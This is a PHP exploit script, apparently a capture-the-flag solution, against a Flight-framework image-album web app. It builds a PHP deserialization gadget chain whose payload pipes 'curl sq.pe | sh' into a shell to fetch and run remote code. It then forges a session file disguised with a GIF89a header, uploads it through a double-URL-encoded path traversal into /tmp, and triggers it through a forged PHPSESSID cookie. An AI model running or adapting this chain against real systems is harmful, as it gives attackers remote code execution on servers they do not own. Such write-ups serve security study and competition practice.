<?php

// Gadgets
namespace flight\core {
    class Dispatcher
    {
    }

    class Loader
    {
        protected array $instances = [];
        protected array $classes = [];
        function __construct()
        {
            $args = ['curl sq.pe | sh'];
            $this->classes = [
                &$args, // create a reference type, maybe not required
                'getUsername' => ['flight\core\Dispatcher::execute', ["system", &$args], ''],
            ];
        }
    }
}

namespace flight {

    use flight\core\{Dispatcher, Loader};

    class Engine
    {
        protected Loader $loader;
        protected Dispatcher $dispatcher;

        public function __construct()
        {
            $this->loader = new Loader();
            $this->dispatcher = new Dispatcher();
        }
    }
}


// main exploit
namespace Exploit {

    use flight;

    $BASE_URL = 'https://imgura-album.h4ck3r.quest';

    // Create forged session
    $sessid = uniqid() . "png";
    session_id($sessid);
    session_save_path('./');
    session_start();
    $_SESSION['GIF89a'] = 0xC8763;
    $_SESSION['user'] = new flight\Engine();
    session_write_close();

    // Write forged session & trigger exploit
    system("
    curl -s $BASE_URL/login -F 'username=meow' --cookie 'PHPSESSID=nyannyannyan' -i
    curl -s $BASE_URL/album/..%252f..%252f..%252f..%252ftmp/add -F 'image=@sess_$sessid' --cookie 'PHPSESSID=nyannyannyan' -i
    curl -s $BASE_URL --cookie 'PHPSESSID=$sessid' -i
    ");

    unlink("sess_$sessid");
}
